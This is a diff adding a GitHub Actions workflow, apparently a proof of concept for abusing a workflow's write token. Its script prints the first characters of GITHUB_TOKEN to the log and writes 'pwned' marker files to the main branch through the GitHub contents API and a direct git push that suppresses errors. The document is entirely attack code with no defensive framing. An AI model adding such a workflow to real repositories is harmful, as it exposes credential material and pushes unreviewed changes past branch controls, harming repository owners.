@@ -1,0 +1,25 @@
+name: pub-token
+on: {workflow_dispatch:}
+permissions: {contents: write}
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          python3 - <<'PY'
+          import base64,json,os,urllib.request,urllib.error
+          tok=os.environ['GITHUB_TOKEN']; nwo=os.environ['GITHUB_REPOSITORY']
+          def call(m,u,b=None):
+              req=urllib.request.Request(u, data=None if b is None else json.dumps(b).encode(), method=m,
+                headers={'Authorization':f'Bearer {tok}','Accept':'application/vnd.github+json','Content-Type':'application/json'})
+              try:
+                  with urllib.request.urlopen(req) as r: print(m,r.status,r.read()[:400].decode())
+              except urllib.error.HTTPError as e: print(m,e.code,e.read()[:400].decode())
+          print('PREFIX', tok[:8])
+          call('PUT', f'https://api.github.com/repos/{nwo}/contents/pwned-ghs-pub.txt',
+               {'message':'ghs','content':base64.b64encode(b'ghs\n').decode(),'branch':'main'})
+          PY
+          git config user.email a@b.c; git config user.name bot
+          echo x >> pwned-ghs-git-pub.txt; git add pwned-ghs-git-pub.txt; git commit -m ghs || true
+          git push origin HEAD:main || true
